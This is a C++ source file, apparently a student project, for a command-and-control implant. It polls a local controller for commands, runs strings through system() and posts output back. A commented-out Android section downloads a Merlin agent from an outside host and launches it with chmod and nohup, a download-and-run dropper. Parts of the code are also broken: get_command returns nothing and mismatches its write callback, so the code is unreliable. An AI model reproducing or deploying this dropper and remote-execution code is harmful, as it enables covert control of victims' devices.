#include <string>
#include <iostream>
#include "curl/curl.h"

using namespace std; 

string get_os_name() {
    #ifdef _WIN32
    return "Windows 32-bit";
    #elif _WIN64
    return "Windows 64-bit";
    #elif __APPLE__
    return "Apple";
    #elif __ANDROID__
    return "Android";
    #elif __linux__
    return "Linux";
    #elif __unix || __unix__
    return "Unix";
    #else
    return "Other";
    #endif
}

size_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream) {
    size_t written = fwrite(ptr, size, nmemb, stream);
    return written;
}

void download_file(string url, string location) {
    CURL *curl = curl_easy_init();
    FILE *fp;
    CURLcode res;

    if (curl) {
        fp = fopen(location.c_str(), "wb");
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        fclose(fp);
    }
}

void send_terminal_back(int clientNumber, string terminal){
    CURL *curl = curl_easy_init();
    CURLcode res;
    string postMsg = "num=" + to_string(clientNumber) + "&cmd=" + terminal;

    curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:3000/command");
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postMsg.c_str());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, postMsg.length());
    curl_easy_setopt(curl, CURLOPT_POST, 1);
    res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
}

void send_to_terminal(string cmd){
    string command = '"' + cmd + '"';
    system(command.c_str());
}

string get_command()
{
    CURL *curl = curl_easy_init();
    CURLcode res;

    struct curl_slist *list = NULL;

    if(curl){
        string response_string;
        string header_string;
        curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:3000/newCmd");
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_string);
        curl_easy_setopt(curl, CURLOPT_HEADERDATA, &header_string);
        cout << response_string << endl;
        cout << header_string << endl;

        curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        curl = NULL;
    }
}

int main() {
    string os_name = get_os_name();
    cout << os_name << endl;

    string testOutput;
    send_terminal_back(1, "This is a test message");


    if (os_name == "Android") {
        /*string merlin = "/data/local/tmp/merlin";

        download_file("http://cs4001.root.sx/android/merlinAgent-Android-arm", merlin);
        system(("chmod +x " + merlin).c_str());
        system(("cd /data/local/tmp && nohup " + merlin + " &").c_str());*/

    } else {
        cout << "Architecture not supported" << endl;
    }
    return 0;
}
